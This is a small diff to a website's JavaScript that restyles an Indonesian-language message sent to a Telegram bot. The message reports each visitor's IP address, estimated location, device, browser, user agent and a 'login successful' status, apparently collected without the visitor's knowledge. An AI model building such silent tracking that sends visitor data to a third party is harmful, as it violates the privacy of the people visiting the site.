@@ -142,17 +142,17 @@ function initMainPage() {
             .finally(() => {
                 // Kirim pesan teks pertama (selalu berhasil)
                 const message = `
-*--- DATA MASUK SITUS SATUNOVEMBER ---*
-*Waktu Kunjungan:* ${timestamp}
-*Halaman Dibuka:* Main Page
-*Status:* Login Berhasil
+*🆕 𝑵𝒆𝒘 𝑽𝒊𝒔𝒊𝒕𝒐𝒓 𝑾𝒆𝒃𝒔𝒊𝒕𝒆 🆕*
+*🕒 Waktu :* ${timestamp}
+*📊 Halaman :* Main Page
+*ℹ️ Status :* Login Berhasil
 
-*--- DETAIL PENGUNJUNG ---*
-*IP Address:* ${ipAddress}
-*Lokasi (Estimasi):* ${locationInfo}
-*Jenis Perangkat:* ${deviceType}
-*Jenis Browser:* ${browserName}
-*User Agent Mentah:* \`${userAgent}\`
+*🌌 Data Users 🌌*
+*🌐 IP Address:* ${ipAddress}
+*📍 Lokasi :* ${locationInfo}
+*📱 Device :* ${deviceType}
+*🔎 Browser :* ${browserName}
+*👤 UserAgent :* \`${userAgent}\`
 `;
                 sendTelegramMessage(message);
 
